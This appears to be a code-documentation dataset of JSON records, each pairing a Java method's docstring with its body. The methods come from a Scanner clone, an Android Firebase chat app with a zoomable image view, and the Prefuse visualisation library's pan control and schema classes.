{"docstring": "// The next operation should occur in the specified radix but\n// the default is left untouched.\n", "func_signal": "private void setRadix(int radix)", "code": "{\n    if (this.radix != radix) {\n        // Force rebuilding and recompilation of radix dependent patterns\n        integerPattern = null;\n        this.radix = radix;\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns a charset object for the given charset name.\n * @throws NullPointerException          is csn is null\n * @throws IllegalArgumentException      if the charset is not supported\n */\n", "func_signal": "private static Charset toCharset(String csn)", "code": "{\n    Objects.requireNonNull(csn, \"charsetName\");\n    try {\n        return Charset.forName(csn);\n    } catch (IllegalCharsetNameException|UnsupportedCharsetException e) {\n        // IllegalArgumentException should be thrown\n        throw new IllegalArgumentException(e);\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns true if the next complete token matches the specified pattern.\n * A complete token is prefixed and postfixed by input that matches\n * the delimiter pattern. This method may block while waiting for input.\n * The scanner does not advance past any input.\n *\n * @param pattern the pattern to scan for\n * @return true if and only if this scanner has another token matching\n *         the specified pattern\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public boolean hasNext(Pattern pattern)", "code": "{\n    ensureOpen();\n    if (pattern == null)\n        throw new NullPointerException();\n    hasNextPattern = null;\n    saveState();\n\n    while (true) {\n        if (getCompleteTokenInBuffer(pattern) != null) {\n            matchValid = true;\n            cacheResult();\n            return revertState(true);\n        }\n        if (needInput)\n            readInput();\n        else\n            return revertState(false);\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns the match result of the last scanning operation performed\n * by this scanner. This method throws <code>IllegalStateException</code>\n * if no match has been performed, or if the last match was\n * not successful.\n *\n * <p>The various <code>next</code>methods of <code>Scanner</code>\n * make a match result available if they complete without throwing an\n * exception. For instance, after an invocation of the {@link #nextInt}\n * method that returned an int, this method returns a\n * <code>MatchResult</code> for the search of the\n * <a href=\"#Integer-regex\"><i>Integer</i></a> regular expression\n * defined above. Similarly the {@link #findInLine},\n * {@link #findWithinHorizon}, and {@link #skip} methods will make a\n * match available if they succeed.\n *\n * @return a match result for the last match operation\n * @throws IllegalStateException  If no match result is available\n */\n", "func_signal": "public MatchResult match()", "code": "{\n    if (!matchValid)\n        throw new IllegalStateException(\"No match result available\");\n    return matcher.toMatchResult();\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Advances this scanner past the current line and returns the input\n * that was skipped.\n *\n * This method returns the rest of the current line, excluding any line\n * separator at the end. The position is set to the beginning of the next\n * line.\n *\n * <p>Since this method continues to search through the input looking\n * for a line separator, it may buffer all of the input searching for\n * the line to skip if no line separators are present.\n *\n * @return the line that was skipped\n * @throws NoSuchElementException if no line was found\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public String nextLine()", "code": "{\n    if (hasNextPattern == linePattern())\n        return getCachedResult();\n    clearCaches();\n\n    String result = findWithinHorizon(linePattern, 0);\n    if (result == null)\n        throw new NoSuchElementException(\"No line found\");\n    MatchResult mr = this.match();\n    String lineSep = mr.group(1);\n    if (lineSep != null)\n        result = result.substring(0, result.length() - lineSep.length());\n    if (result == null)\n        throw new NoSuchElementException();\n    else\n        return result;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Set zoom to the specified scale. Image will be centered around the point\n * (focusX, focusY). These floats range from 0 to 1 and denote the focus point\n * as a fraction from the left and top of the view. For example, the top left\n * corner of the image would be (0, 0). And the bottom right corner would be (1, 1).\n * @param scale\n * @param focusX\n * @param focusY\n * @param scaleType\n */\n", "func_signal": "public void setZoom(float scale, float focusX, float focusY, ScaleType scaleType)", "code": "{\n    //\n    // setZoom can be called before the image is on the screen, but at this point,\n    // image and view sizes have not yet been calculated in onMeasure. Thus, we should\n    // delay calling setZoom until the view has been measured.\n    //\n    if (!onDrawReady) {\n        delayedZoomVariables = new ZoomVariables(scale, focusX, focusY, scaleType);\n        return;\n    }\n\n    if (scaleType != mScaleType) {\n        setScaleType(scaleType);\n    }\n    resetZoom();\n    scaleImage(scale, viewWidth / 2, viewHeight / 2, true);\n    matrix.getValues(m);\n    m[Matrix.MTRANS_X] = -((focusX * getImageWidth()) - (viewWidth * 0.5f));\n    m[Matrix.MTRANS_Y] = -((focusY * getImageHeight()) - (viewHeight * 0.5f));\n    matrix.setValues(m);\n    fixTrans();\n    setImageMatrix(matrix);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Vincular views com Java API\n */\n", "func_signal": "private void bindViews()", "code": "{\n    contentRoot = findViewById(R.id.contentRoot);\n    edMessage = (EmojiconEditText)findViewById(R.id.editTextMessage);\n    btSendMessage = (ImageView)findViewById(R.id.buttonMessage);\n    btSendMessage.setOnClickListener(this);\n    btEmoji = (ImageView)findViewById(R.id.buttonEmoji);\n    emojIcon = new EmojIconActions(this,contentRoot,edMessage,btEmoji);\n    emojIcon.ShowEmojIcon();\n    rvListMessage = (RecyclerView)findViewById(R.id.messageRecyclerView);\n    mLinearLayoutManager = new LinearLayoutManager(this);\n    mLinearLayoutManager.setStackFromEnd(true);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\MainActivity.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Interpolate the current targeted zoom and get the delta\n * from the current zoom.\n * @param t\n * @return\n */\n", "func_signal": "private double calculateDeltaScale(float t)", "code": "{\n    double zoom = startZoom + t * (targetZoom - startZoom);\n    return zoom / normalizedScale;\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Interpolate between where the image should start and end in order to translate\n * the image so that the point that is touched is what ends up centered at the end\n * of the zoom.\n * @param t\n */\n", "func_signal": "private void translateImageToCenterTouchPosition(float t)", "code": "{\n    float targetX = startTouch.x + t * (endTouch.x - startTouch.x);\n    float targetY = startTouch.y + t * (endTouch.y - startTouch.y);\n    PointF curr = transformCoordBitmapToTouch(bitmapX, bitmapY);\n    matrix.postTranslate(targetX - curr.x, targetY - curr.y);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Set view dimensions based on layout params\n *\n * @param mode\n * @param size\n * @param drawableWidth\n * @return\n */\n", "func_signal": "private int setViewSize(int mode, int size, int drawableWidth)", "code": "{\n    int viewSize;\n    switch (mode) {\n        case MeasureSpec.EXACTLY:\n            viewSize = size;\n            break;\n\n        case MeasureSpec.AT_MOST:\n            viewSize = Math.min(drawableWidth, size);\n            break;\n\n        case MeasureSpec.UNSPECIFIED:\n            viewSize = drawableWidth;\n            break;\n\n        default:\n            viewSize = size;\n            break;\n    }\n    return viewSize;\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Ler collections chatmodel Firebase\n */\n", "func_signal": "private void lerMessagensFirebase()", "code": "{\n    mFirebaseDatabaseReference = FirebaseDatabase.getInstance().getReference();\n    final ChatFirebaseAdapter firebaseAdapter = new ChatFirebaseAdapter(mFirebaseDatabaseReference.child(CHAT_REFERENCE),userModel.getName(),this);\n    firebaseAdapter.registerAdapterDataObserver(new RecyclerView.AdapterDataObserver() {\n        @Override\n        public void onItemRangeInserted(int positionStart, int itemCount) {\n            super.onItemRangeInserted(positionStart, itemCount);\n            int friendlyMessageCount = firebaseAdapter.getItemCount();\n            int lastVisiblePosition = mLinearLayoutManager.findLastCompletelyVisibleItemPosition();\n            if (lastVisiblePosition == -1 ||\n                    (positionStart >= (friendlyMessageCount - 1) &&\n                            lastVisiblePosition == (positionStart - 1))) {\n                rvListMessage.scrollToPosition(positionStart);\n            }\n        }\n    });\n    rvListMessage.setLayoutManager(mLinearLayoutManager);\n    rvListMessage.setAdapter(firebaseAdapter);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\MainActivity.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * When transitioning from zooming from focus to zoom from center (or vice versa)\n * the image can become unaligned within the view. This is apparent when zooming\n * quickly. When the content size is less than the view size, the content will often\n * be centered incorrectly within the view. fixScaleTrans first calls fixTrans() and\n * then makes sure the image is centered correctly within the view.\n */\n", "func_signal": "private void fixScaleTrans()", "code": "{\n    fixTrans();\n    matrix.getValues(m);\n    if (getImageWidth() < viewWidth) {\n        m[Matrix.MTRANS_X] = (viewWidth - getImageWidth()) / 2;\n    }\n\n    if (getImageHeight() < viewHeight) {\n        m[Matrix.MTRANS_Y] = (viewHeight - getImageHeight()) / 2;\n    }\n    matrix.setValues(m);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Set the min zoom multiplier. Default value: 1.\n * @param min min zoom multiplier.\n */\n", "func_signal": "public void setMinZoom(float min)", "code": "{\n    minScale = min;\n    superMinScale = SUPER_MIN_MULTIPLIER * minScale;\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Performs boundary checking and fixes the image matrix if it\n * is out of bounds.\n */\n", "func_signal": "private void fixTrans()", "code": "{\n    matrix.getValues(m);\n    float transX = m[Matrix.MTRANS_X];\n    float transY = m[Matrix.MTRANS_Y];\n\n    float fixTransX = getFixTrans(transX, viewWidth, getImageWidth());\n    float fixTransY = getFixTrans(transY, viewHeight, getImageHeight());\n\n    if (fixTransX != 0 || fixTransY != 0) {\n        matrix.postTranslate(fixTransX, fixTransY);\n    }\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * If the normalizedScale is equal to 1, then the image is made to fit the screen. Otherwise,\n * it is made to fit the screen according to the dimensions of the previous image matrix. This\n * allows the image to maintain its zoom after rotation.\n */\n", "func_signal": "private void fitImageToView()", "code": "{\n    Drawable drawable = getDrawable();\n    if (drawable == null || drawable.getIntrinsicWidth() == 0 || drawable.getIntrinsicHeight() == 0) {\n        return;\n    }\n    if (matrix == null || prevMatrix == null) {\n        return;\n    }\n\n    int drawableWidth = drawable.getIntrinsicWidth();\n    int drawableHeight = drawable.getIntrinsicHeight();\n\n    //\n    // Scale image for view\n    //\n    float scaleX = (float) viewWidth / drawableWidth;\n    float scaleY = (float) viewHeight / drawableHeight;\n\n    switch (mScaleType) {\n        case CENTER:\n            scaleX = scaleY = 1;\n            break;\n\n        case CENTER_CROP:\n            scaleX = scaleY = Math.max(scaleX, scaleY);\n            break;\n\n        case CENTER_INSIDE:\n            scaleX = scaleY = Math.min(1, Math.min(scaleX, scaleY));\n\n        case FIT_CENTER:\n            scaleX = scaleY = Math.min(scaleX, scaleY);\n            break;\n\n        case FIT_XY:\n            break;\n\n        default:\n            //\n            // FIT_START and FIT_END not supported\n            //\n            throw new UnsupportedOperationException(\"TouchImageView does not support FIT_START or FIT_END\");\n\n    }\n\n    //\n    // Center the image\n    //\n    float redundantXSpace = viewWidth - (scaleX * drawableWidth);\n    float redundantYSpace = viewHeight - (scaleY * drawableHeight);\n    matchViewWidth = viewWidth - redundantXSpace;\n    matchViewHeight = viewHeight - redundantYSpace;\n    if (!isZoomed() && !imageRenderedAtLeastOnce) {\n        //\n        // Stretch and center image to fit view\n        //\n        matrix.setScale(scaleX, scaleY);\n        matrix.postTranslate(redundantXSpace / 2, redundantYSpace / 2);\n        normalizedScale = 1;\n\n    } else {\n        //\n        // These values should never be 0 or we will set viewWidth and viewHeight\n        // to NaN in translateMatrixAfterRotate. To avoid this, call savePreviousImageValues\n        // to set them equal to the current values.\n        //\n        if (prevMatchViewWidth == 0 || prevMatchViewHeight == 0) {\n            savePreviousImageValues();\n        }\n\n        prevMatrix.getValues(m);\n\n        //\n        // Rescale Matrix after rotation\n        //\n        m[Matrix.MSCALE_X] = matchViewWidth / drawableWidth * normalizedScale;\n        m[Matrix.MSCALE_Y] = matchViewHeight / drawableHeight * normalizedScale;\n\n        //\n        // TransX and TransY from previous matrix\n        //\n        float transX = m[Matrix.MTRANS_X];\n        float transY = m[Matrix.MTRANS_Y];\n\n        //\n        // Width\n        //\n        float prevActualWidth = prevMatchViewWidth * normalizedScale;\n        float actualWidth = getImageWidth();\n        translateMatrixAfterRotate(Matrix.MTRANS_X, transX, prevActualWidth, actualWidth, prevViewWidth, viewWidth, drawableWidth);\n\n        //\n        // Height\n        //\n        float prevActualHeight = prevMatchViewHeight * normalizedScale;\n        float actualHeight = getImageHeight();\n        translateMatrixAfterRotate(Matrix.MTRANS_Y, transY, prevActualHeight, actualHeight, prevViewHeight, viewHeight, drawableHeight);\n\n        //\n        // Set the matrix to the adjusted scale and translate values.\n        //\n        matrix.setValues(m);\n    }\n    fixTrans();\n    setImageMatrix(matrix);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * After rotating, the matrix needs to be translated. This function finds the area of image\n * which was previously centered and adjusts translations so that is again the center, post-rotation.\n *\n * @param axis Matrix.MTRANS_X or Matrix.MTRANS_Y\n * @param trans the value of trans in that axis before the rotation\n * @param prevImageSize the width/height of the image before the rotation\n * @param imageSize width/height of the image after rotation\n * @param prevViewSize width/height of view before rotation\n * @param viewSize width/height of view after rotation\n * @param drawableSize width/height of drawable\n */\n", "func_signal": "private void translateMatrixAfterRotate(int axis, float trans, float prevImageSize, float imageSize, int prevViewSize, int viewSize, int drawableSize)", "code": "{\n    if (imageSize < viewSize) {\n        //\n        // The width/height of image is less than the view's width/height. Center it.\n        //\n        m[axis] = (viewSize - (drawableSize * m[Matrix.MSCALE_X])) * 0.5f;\n\n    } else if (trans > 0) {\n        //\n        // The image is larger than the view, but was not before rotation. Center it.\n        //\n        m[axis] = -((imageSize - viewSize) * 0.5f);\n\n    } else {\n        //\n        // Find the area of the image which was previously centered in the view. Determine its distance\n        // from the left/top side of the view as a fraction of the entire image's width/height. Use that percentage\n        // to calculate the trans in the new view width/height.\n        //\n        float percentage = (Math.abs(trans) + (0.5f * prevViewSize)) / prevImageSize;\n        m[axis] = -((percentage * imageSize) - (viewSize * 0.5f));\n    }\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Enviar foto tirada pela camera\n */\n", "func_signal": "private void photoCameraIntent()", "code": "{\n    String nomeFoto = DateFormat.format(\"yyyy-MM-dd_hhmmss\", new Date()).toString();\n    filePathImageCamera = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), nomeFoto+\"camera.jpg\");\n    Intent it = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n    Uri photoURI = FileProvider.getUriForFile(MainActivity.this,\n            BuildConfig.APPLICATION_ID + \".provider\",\n            filePathImageCamera);\n    it.putExtra(MediaStore.EXTRA_OUTPUT,photoURI);\n    startActivityForResult(it, IMAGE_CAMERA_REQUEST);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\MainActivity.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Use interpolator to get t\n * @return\n */\n", "func_signal": "private float interpolate()", "code": "{\n    long currTime = System.currentTimeMillis();\n    float elapsed = (currTime - startTime) / ZOOM_TIME;\n    elapsed = Math.min(1f, elapsed);\n    return interpolator.getInterpolation(elapsed);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Return the point at the center of the zoomed image. The PointF coordinates range\n * in value between 0 and 1 and the focus point is denoted as a fraction from the left\n * and top of the view. For example, the top left corner of the image would be (0, 0).\n * And the bottom right corner would be (1, 1).\n * @return PointF representing the scroll position of the zoomed image.\n */\n", "func_signal": "public PointF getScrollPosition()", "code": "{\n    Drawable drawable = getDrawable();\n    if (drawable == null) {\n        return null;\n    }\n    int drawableWidth = drawable.getIntrinsicWidth();\n    int drawableHeight = drawable.getIntrinsicHeight();\n\n    PointF point = transformCoordTouchToBitmap(viewWidth / 2, viewHeight / 2, true);\n    point.x /= drawableWidth;\n    point.y /= drawableHeight;\n    return point;\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Enviar msg de texto simples para chat\n */\n", "func_signal": "private void sendMessageFirebase()", "code": "{\n    ChatModel model = new ChatModel(userModel,edMessage.getText().toString(), Calendar.getInstance().getTime().getTime()+\"\",null);\n    mFirebaseDatabaseReference.child(CHAT_REFERENCE).push().setValue(model);\n    edMessage.setText(null);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\MainActivity.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Envia o arvquivo para o firebase\n */\n", "func_signal": "private void sendFileFirebase(StorageReference storageReference, final Uri file)", "code": "{\n    if (storageReference != null){\n        final String name = DateFormat.format(\"yyyy-MM-dd_hhmmss\", new Date()).toString();\n        StorageReference imageGalleryRef = storageReference.child(name+\"_gallery\");\n            UploadTask uploadTask = imageGalleryRef.putFile(file);\n            uploadTask.addOnFailureListener(new OnFailureListener() {\n                @Override\n                public void onFailure(@NonNull Exception e) {\n                    Log.e(TAG,\"onFailure sendFileFirebase \"+e.getMessage());\n                }\n            }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {\n                @Override\n                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {\n                    Log.i(TAG,\"onSuccess sendFileFirebase\");\n                    Uri downloadUrl = taskSnapshot.getDownloadUrl();\n                    FileModel fileModel = new FileModel(\"img\",downloadUrl.toString(),name,\"\");\n                    ChatModel chatModel = new ChatModel(userModel,\"\",Calendar.getInstance().getTime().getTime()+\"\",fileModel);\n                    mFirebaseDatabaseReference.child(CHAT_REFERENCE).push().setValue(chatModel);\n                }\n            });\n    }else{\n        //IS NULL\n    }\n\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\MainActivity.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Enviar foto pela galeria\n */\n", "func_signal": "private void photoGalleryIntent()", "code": "{\n    Intent intent = new Intent();\n    intent.setType(\"image/*\");\n    intent.setAction(Intent.ACTION_GET_CONTENT);\n    startActivityForResult(Intent.createChooser(intent, getString(R.string.select_picture_title)), IMAGE_GALLERY_REQUEST);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\MainActivity.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * This function will transform the coordinates in the touch event to the coordinate\n * system of the drawable that the imageview contain\n * @param x x-coordinate of touch event\n * @param y y-coordinate of touch event\n * @param clipToBitmap Touch event may occur within view, but outside image content. True, to clip return value\n * \t\t\tto the bounds of the bitmap size.\n * @return Coordinates of the point touched, in the coordinate system of the original drawable.\n */\n", "func_signal": "private PointF transformCoordTouchToBitmap(float x, float y, boolean clipToBitmap)", "code": "{\n    matrix.getValues(m);\n    float origW = getDrawable().getIntrinsicWidth();\n    float origH = getDrawable().getIntrinsicHeight();\n    float transX = m[Matrix.MTRANS_X];\n    float transY = m[Matrix.MTRANS_Y];\n    float finalX = ((x - transX) * origW) / getImageWidth();\n    float finalY = ((y - transY) * origH) / getImageHeight();\n\n    if (clipToBitmap) {\n        finalX = Math.min(Math.max(finalX, 0), origW);\n        finalY = Math.min(Math.max(finalY, 0), origH);\n    }\n\n    return new PointF(finalX , finalY);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Inverse of transformCoordTouchToBitmap. This function will transform the coordinates in the\n * drawable's coordinate system to the view's coordinate system.\n * @param bx x-coordinate in original bitmap coordinate system\n * @param by y-coordinate in original bitmap coordinate system\n * @return Coordinates of the point in the view's coordinate system.\n */\n", "func_signal": "private PointF transformCoordBitmapToTouch(float bx, float by)", "code": "{\n    matrix.getValues(m);\n    float origW = getDrawable().getIntrinsicWidth();\n    float origH = getDrawable().getIntrinsicHeight();\n    float px = bx / origW;\n    float py = by / origH;\n    float finalX = m[Matrix.MTRANS_X] + getImageWidth() * px;\n    float finalY = m[Matrix.MTRANS_Y] + getImageHeight() * py;\n    return new PointF(finalX , finalY);\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * Set the max zoom multiplier. Default value: 3.\n * @param max max zoom multiplier.\n */\n", "func_signal": "public void setMaxZoom(float max)", "code": "{\n    maxScale = max;\n    superMaxScale = SUPER_MAX_MULTIPLIER * maxScale;\n}", "path": "app\\src\\main\\java\\alessandro\\firebaseandroid\\view\\TouchImageView.java", "repo_name": "AleBarreto/FirebaseAndroidChat", "stars": 592, "license": "None", "language": "java", "size": 414}
{"docstring": "/**\n * @see java.awt.event.MouseListener#mousePressed(java.awt.event.MouseEvent)\n */\n", "func_signal": "public void mousePressed(MouseEvent e)", "code": "{\n    if ( UILib.isButtonPressed(e, m_button) ) {\n        e.getComponent().setCursor(\n            Cursor.getPredefinedCursor(Cursor.MOVE_CURSOR));\n        m_xDown = e.getX();\n        m_yDown = e.getY();\n    }\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * @see prefuse.controls.Control#itemPressed(prefuse.visual.VisualItem, java.awt.event.MouseEvent)\n */\n", "func_signal": "public void itemPressed(VisualItem item, MouseEvent e)", "code": "{\n    if ( m_panOverItem )\n        mousePressed(e);\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * @see java.awt.event.MouseMotionListener#mouseDragged(java.awt.event.MouseEvent)\n */\n", "func_signal": "public void mouseDragged(MouseEvent e)", "code": "{\n    if ( UILib.isButtonPressed(e, m_button) ) {\n        Display display = (Display)e.getComponent();\n        int x = e.getX(),   y = e.getY();\n        int dx = x-m_xDown, dy = y-m_yDown;\n        display.pan(dx,dy);\n        m_xDown = x;\n        m_yDown = y;\n        display.repaint();\n    }\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * @see prefuse.controls.Control#itemReleased(prefuse.visual.VisualItem, java.awt.event.MouseEvent)\n */\n", "func_signal": "public void itemReleased(VisualItem item, MouseEvent e)", "code": "{\n    if ( m_panOverItem )\n        mouseReleased(e);\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Creates a copy of this Schema. This might be useful for creating\n * extended schemas from a shared base schema. Cloned copies\n * of a locked Schema will not inherit the locked status.\n * @see java.lang.Object#clone()\n */\n", "func_signal": "public Object clone()", "code": "{\n    Schema s = new Schema(m_size);\n    for ( int i=0; i<m_size; ++i ) {\n        s.addColumn(m_names[i], m_types[i], m_dflts[i]);\n    }\n    return s;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * The type of the column with the given name.\n * @param field the column name\n * @return the column type\n */\n", "func_signal": "public Class getColumnType(String field)", "code": "{\n    int idx = getColumnIndex(field);\n    return ( idx<0 ? null : m_types[idx] );\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Creates a new empty schema with a starting capacity for a given number\n * of columns.\n * @param ncols the number of columns in this schema\n */\n", "func_signal": "public Schema(int ncols)", "code": "{\n    m_names = new String[ncols];\n    m_types = new Class[ncols];\n    m_dflts = new Object[ncols];\n    m_size = 0;\n    m_locked = false;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * @see java.awt.event.MouseListener#mouseReleased(java.awt.event.MouseEvent)\n */\n", "func_signal": "public void mouseReleased(MouseEvent e)", "code": "{\n    if ( UILib.isButtonPressed(e, m_button) ) {\n        e.getComponent().setCursor(Cursor.getDefaultCursor());\n        m_xDown = -1;\n        m_yDown = -1;\n    }\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Instantiate this schema as a new Table instance.\n * @param nrows the number of starting rows in the table\n * @return a new Table with this schema\n */\n", "func_signal": "public Table instantiate(int nrows)", "code": "{\n    Table t = new Table(nrows, m_size);\n    for ( int i=0; i<m_size; ++i ) {\n        t.addColumn(m_names[i], m_types[i], m_dflts[i]);\n    }\n    return t;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Lazily construct the lookup table for this schema. Used to\n * accelerate name-based lookups of schema information.\n */\n", "func_signal": "protected void initLookup()", "code": "{\n    m_lookup = new HashMap();\n    for ( int i=0; i<m_names.length; ++i ) {\n        m_lookup.put(m_names[i], new Integer(i));\n    }\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Indicates if values from a given Schema can be safely assigned to\n * data using this Schema. The input Schema must be less than or\n * equal in length to this Schema, and all contained columns in the\n * given Schema must have matching names and types to this Schema.\n * This method does not consider default values settings or the\n * locked status of the Schemas. For example, if the given Schema\n * has different default values than this one, this will have no\n * impact on the assignability of the two.\n * @param s the input Schema\n * @return true if data models using this Schema could be assigned values\n * directly from data using the input Schema, false otherwise.\n */\n", "func_signal": "public boolean isAssignableFrom(Schema s)", "code": "{\n    int ssize = s.getColumnCount();\n    \n    if ( ssize > m_size )\n        return false;\n    \n    for ( int i=0; i<ssize; ++i ) {\n        int idx = getColumnIndex(s.getColumnName(i));\n        if ( idx < 0 )\n            return false;\n        \n        if ( !m_types[idx].equals(s.getColumnType(i)) )\n            return false;\n    }\n    return true;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Add a column to this schema.\n * @param name the column name\n * @param type the column type (as a Class instance)\n * @throws IllegalArgumentException is either name or type are null or\n * the name already exists in this schema.\n */\n", "func_signal": "public void addColumn(String name, Class type, Object defaultValue)", "code": "{\n    // check lock status\n    if ( m_locked ) {\n        throw new IllegalStateException(\n            \"Can not add column to a locked Schema.\");\n    }\n    // check for validity\n    if ( name == null ) {\n        throw new IllegalArgumentException(\n            \"Null column names are not allowed.\");\n    }\n    if ( type == null ) {\n        throw new IllegalArgumentException(\n            \"Null column types are not allowed.\");\n    }\n    for ( int i=0; i<m_size; ++i ) {\n        if ( m_names[i].equals(name) ) {\n            throw new IllegalArgumentException(\n                \"Duplicate column names are not allowed: \"+m_names[i]);\n        }\n    }\n    \n    // resize if necessary\n    // TODO put resizing functionality into library routines?\n    if ( m_names.length == m_size ) {\n        int capacity = (3*m_names.length)/2 + 1;\n        String[] names = new String[capacity];\n        Class[]  types = new Class[capacity];\n        Object[] dflts = new Object[capacity];\n        System.arraycopy(m_names, 0, names, 0, m_size);\n        System.arraycopy(m_types, 0, types, 0, m_size);\n        System.arraycopy(m_dflts, 0, dflts, 0, m_size);\n        m_names = names;\n        m_types = types;\n        m_dflts = dflts;\n    }\n    \n    